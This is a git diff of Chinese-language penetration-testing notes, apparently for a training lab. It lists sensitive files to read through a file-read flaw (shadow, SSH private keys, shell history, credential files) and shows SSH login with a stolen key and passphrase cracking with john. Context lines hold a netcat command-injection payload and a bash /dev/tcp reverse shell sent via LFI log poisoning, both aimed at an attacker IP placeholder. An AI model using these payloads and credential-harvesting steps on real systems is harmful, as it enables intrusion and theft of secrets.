@@ -635,21 +635,64 @@ fetch(`/getflag\)
     $ curl -X POST --data 'Archive=git%3BC%3A%5CWindows%5CTemp%5Cnc.exe%20-e%20cmd.exe%20<攻擊者IP>%204444' http://<受害者IP>/archive
     ```
 
-### LFI
+### 讀擋
 
-- 前提: 在 PHP 中需要特別啟用 `allow_url_include`
-- 試著讀取 `/home/daniela/.ssh/id_rsa` 並且 ssh 登入
+可以讀的檔案
+
+<details markdown="1"><summary><span class="spoiler">帳號與認證相關</span></summary>
+
+- /etc/passwd — 列出所有使用者、home 目錄路徑、login shell。知道有哪些使用者才能去翻他們的檔案。
+- /etc/shadow — 密碼 hash（通常 www-data 沒權限讀，但值得試）。
+- /home/<user>/.ssh/id_rsa、id_ecdsa、id_ed25519 — SSH 私鑰，你就是靠讀 anita 的 id_ecdsa 拿下這台的。
+- /home/<user>/.ssh/authorized_keys — 看誰能 SSH 進來，也能確認使用者名稱。
+- /home/<user>/.bash_history — 歷史指令，常洩漏密碼、內部 IP、其他主機資訊。
+
+</details>
+
+<details markdown="1"><summary><span class="spoiler">系統與網路</span></summary>
+
+- /etc/hostname — 確認機器名。
+- /etc/hosts — 內部 DNS 對應，可能揭露隱藏的內網機器或 domain。
+- /etc/resolv.conf — DNS 設定，判斷內網結構。
+- /proc/net/tcp 或 /etc/network/interfaces、/etc/netplan/\*.yaml — 網卡設定，看有沒有第二張網卡（雙網段 pivot 的線索）。
+</details>
+
+<details markdown="1"><summary><span class="spoiler">服務設定（依目標而定）</span></summary>
+
+- Apache 設定：httpd.conf、/etc/apache2/sites-enabled/\* — 你已經讀過了，發現 mod_cgi 關閉和 port 8000 WSGI。
+- /opt/apache2/login_handler/ 底下的所有檔案 — WSGI app 可能有資料庫連線字串。
+- 其他 web app 的 config（如 wp-config.php、config.php、.env）— 常含 DB 密碼。
+
+</details>
+
+<details markdown="1"><summary><span class="spoiler">憑證與敏感資料</span></summary>
+
+- /etc/crontab、/var/spool/cron/crontabs/<user> — 排程任務，可能以 root 跑可寫腳本。
+- `/root/.ssh/id_rsa` — root 的 SSH key（通常沒權限，但試試）。
+- `/var/www/` 或 `/opt/` 底下的 `.git/config` — 可能有 repo URL 含 token。
+- `/home/<user>/.pgpass`、`.my.cnf`、`.netrc` — 資料庫或服務的明文密碼。
+
+</details>
+
+#### 利用讀檔案 → ssh 連線
+
+- 試著讀取 `/home/<user>/.ssh/authorized_keys`: authorized_keys 裡每一行的開頭會寫 key 類型，像 `ecdsa-sha2-nistp256 AAAA...`，所以一看就知道要去讀哪個私鑰檔。如果寫的是 ssh-rsa，你就讀 `id_rsa`。
+- 並且 ssh 登入
   ```bash
-  # 讀取到 /home/daniela/.ssh/id_rsa 並且把讀到的資訊存成檔案
+  # 讀取到 /home/<user>/.ssh/id_rsa 並且把讀到的資訊存成檔案
   # 試著登入
   $ chmod 600 id_rsa # 不能設定太寬權限，會無法登入
   $ ssh -i id_rsa user@<target_IP>
   ```
-  如果還要打 password 代表他有 passphrase 保護
+- 如果還要打 password 代表他有 passphrase 保護
   ```bash
   $ ssh2john id_rsa > hash.txt
   $ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
   ```
+
+#### LFI
+
+- 前提: 在 PHP 中需要特別啟用 `allow_url_include`
 - 只是能讀取到 victim server 上的 file content，不見得會有價值，需要搭配其他手法，例如
   1. 寫入 webshell 之類的達到 RCE
   2. 利用 PHP 的偽協議達到讀特殊檔案的需求: 有時候，我們從前端頁面看到的內容是已經被 php 執行完的結果，就算查看該頁面的原始碼，也看不到當初 php 寫的東西，這時候就可以利用 php wrapper 讀到最原始的 content，<span style="background-color: yellow">PHP Wrapper 是有 LFI 弱點才能用</span>
@@ -741,7 +784,7 @@ bash -c 'bash -i >& /dev/tcp/<攻擊者IP>/4444 0>&1'
 $ curl "http://mountaindesserts.local/meteor/index.php?page=../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<攻擊者IP>%2F4444%200%3E%261%22"
 ```
 
-### RFI
+#### RFI
 
 和 LFI 的差別就是， RFI 弱點是可以讀到**外部**的 file，所以我們可以嘗試在 local 端建一個 http server，讓 victim server 連自己的 http server 拿到 webshell 並且實際執行指令
 
